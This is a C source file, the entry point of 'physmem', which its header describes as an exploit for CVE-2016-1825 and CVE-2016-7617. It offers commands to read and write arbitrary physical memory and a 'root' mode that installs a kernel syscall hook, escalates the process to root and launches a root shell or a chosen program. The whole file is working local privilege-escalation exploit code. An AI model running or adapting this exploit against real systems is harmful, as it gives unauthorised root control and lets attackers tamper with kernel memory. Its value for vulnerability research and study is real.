/*
 * main.c
 * Brandon Azad
 *
 * Entry point for physmem, an exploit for CVE-2016-1825 and CVE-2016-7617.
 */

#include "fail.h"
#include "kernel_image.h"
#include "kernel_slide.h"
#include "physmem.h"
#include "privilege_escalation.h"
#include "syscall_hook.h"

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdnoreturn.h>
#include <string.h>
#include <unistd.h>

/*
 * parse_u64
 *
 * Description:
 * 	Parse a string into a uint64_t.
 */
static uint64_t parse_u64(const char *str) {
	char *end;
	uint64_t value = strtoull(str, &end, 0);
	if (*str == 0 || *end != 0) {
		FAIL("invalid integer '%s'", str);
	}
	return value;
}

/*
 * parse_width
 *
 * Description:
 * 	Parse a string into a width appropriate for phys_read/phys_write.
 */
static unsigned parse_width(const char *str) {
	uint64_t width = parse_u64(str);
	if (width != 1 && width != 2 && width != 4 && width != 8) {
		FAIL("invalid width %llu", width);
	}
	return (unsigned)width;
}

/*
 * usage
 *
 * Description:
 * 	Print usage information and exit.
 */
static noreturn void usage() {
	fprintf(stderr, "usage:\n"
			"    %1$s read <addr> [<width>]\n"
			"    %1$s write <addr> <value> [<width>]\n"
			"    %1$s root [utility [<argument> ...]]\n",
			getprogname());
	exit(1);
}

/*
 * physmem_read
 *
 * Description:
 * 	Parse the arguments and read from physical memory.
 */
static void physmem_read(int argc, const char *argv[]) {
	if (argc < 1) {
		usage();
	}
	uint64_t paddr = parse_u64(argv[0]);
	uint64_t value;
	unsigned width = sizeof(value);
	if (argc == 2) {
		width = parse_width(argv[1]);
	} else if (argc != 1) {
		usage();
	}
	physmem_init();
	value = phys_read(paddr, width);
	printf("%0*llx\n", 2 * width, value);
}

/*
 * physmem_write
 *
 * Description:
 * 	Parse the arguments and write to physical memory.
 */
static void physmem_write(int argc, const char *argv[]) {
	if (argc < 2) {
		usage();
	}
	uint64_t paddr = parse_u64(argv[0]);
	uint64_t value = parse_u64(argv[1]);
	unsigned width = sizeof(value);
	if (argc == 3) {
		width = parse_width(argv[2]);
	} else if (argc != 2) {
		usage();
	}
	physmem_init();
	phys_write(paddr, value, width);
}

/*
 * physmem_root
 *
 * Description:
 * 	Exec the specified program as root. If no program is specified, exec a root shell instead.
 */
static void physmem_root(int argc, const char *prog_argv[]) {
	char *default_argv[] = { "/bin/sh", NULL };
	char **argv = (char **)prog_argv;
	if (argc == 0) {
		argv = default_argv;
	}
	kernel_init();
	physmem_init();
	probe_kernel_slide();
	syscall_hook_install();
	setuid_root();
	syscall_hook_remove();
	execve(argv[0], argv, NULL);
	FAIL("execve failed: %s", strerror(errno));
}

int main(int argc, const char *argv[]) {
	if (argc < 2) {
		usage();
	}
	if (strcmp(argv[1], "read") == 0) {
		physmem_read(argc - 2, argv + 2);
	} else if (strcmp(argv[1], "write") == 0) {
		physmem_write(argc - 2, argv + 2);
	} else if (strcmp(argv[1], "root") == 0) {
		physmem_root(argc - 2, argv + 2);
	} else {
		usage();
	}
	return 0;
}
